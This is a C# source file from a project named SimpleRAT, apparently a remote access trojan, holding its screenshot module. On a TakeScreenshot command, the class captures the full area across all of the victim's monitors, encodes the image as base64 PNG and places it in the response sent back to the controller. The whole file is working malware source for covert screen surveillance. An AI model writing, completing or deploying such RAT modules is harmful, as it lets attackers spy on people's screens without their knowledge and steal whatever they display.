using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using SimpleRAT.Communication;

namespace SimpleRAT.Features
{
    public class Screenshot : BaseFeature
    {
        public static Screenshot Instance => new Screenshot();

        internal Screenshot() : base(Commands.TakeScreenshot) { }

        public override void Handle(Context context)
        {
            var x1 = Screen.AllScreens.Min(s => s.Bounds.Left);
            var y1 = Screen.AllScreens.Min(s => s.Bounds.Top);
            var x2 = Screen.AllScreens.Max(s => s.Bounds.Right);
            var y2 = Screen.AllScreens.Max(s => s.Bounds.Bottom);

            using (var bmp = new Bitmap(x2 - x1, y2 - y1))
            {
                using (var g = Graphics.FromImage(bmp))
                {
                    g.CopyFromScreen(x1, y1, 0, 0, bmp.Size, CopyPixelOperation.SourceCopy);
                }
                byte[] data = null;
                using (var mem = new MemoryStream())
                {
                    bmp.Save(mem, System.Drawing.Imaging.ImageFormat.Png);
                    data = mem.ToArray();
                }
                context.Response.Content["image"] = Convert.ToBase64String(data);
            }
        }
    }
}
